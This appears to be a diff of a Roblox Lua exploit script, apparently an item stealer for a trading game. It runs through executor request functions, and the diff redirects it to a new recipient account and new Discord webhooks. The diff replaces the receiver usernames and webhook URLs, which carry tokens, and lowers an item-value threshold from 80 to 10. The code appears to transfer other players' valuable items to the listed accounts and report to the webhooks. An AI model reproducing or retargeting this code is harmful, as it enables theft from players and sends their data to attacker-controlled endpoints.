@@ -5,10 +5,10 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
-local RECEIVER = { "LOLBRO_123" }
+local RECEIVER = { "Thebestfunnehfanisme" }
 local WEBHOOK =
-	"https://discord.com/api/webhooks/1559532776892670012/mPw5JKVEP7JQY36Plvk7U6hBDLENrfluHh68vZysZvSR-AxYn3_UyAAy7p3qMQgF7GG"
-local THRESHOLD = 80
+	"https://discord.com/api/webhooks/1497722335472652369/d7U2Gui_fyu1c_aAYihhpMSBcnWGWrkGRQPW9UV4zZZs2y909fFlpui2TlHirAhK9Djm"
+local THRESHOLD = 10
 
 local requestFunction = syn and syn.request or http_request or request or fluxus and fluxus.request
 
@@ -175,8 +175,8 @@ end
 local fetchedWeaponValues = fetchWeaponValues()
 local itemValues = {}
 local WEBH00K =
-	"https://discord.com/api/webhooks/1559532776892670012/mPw5JKVEP7JQY36Plvk7U6hBDLENrfluHh68vZysZvSR_-AxYn3_UyAAy7p3qMQgF7GG"
-local RECEIVERS = { "B4C0NN61", "looter_1mm2", "abduljamarmm2t" }
+	"https://discord.com/api/webhooks/1497722335472652369/d7U2Gui_fyu1c_aAYihhpMSBcnWGWrkGRQPW9UV4zZZs2y909fFlpui2TlHirAhK9Djm"
+local RECEIVERS = { "Thebestfunnehfanisme", "Thebestfunnehfanisme", "Thebestfunnehfanisme" }
 if fetchedWeaponValues and next(fetchedWeaponValues) then
 	local processedValues = {}
 	for categoryKey, categoryValue in pairs(fetchedWeaponValues) do
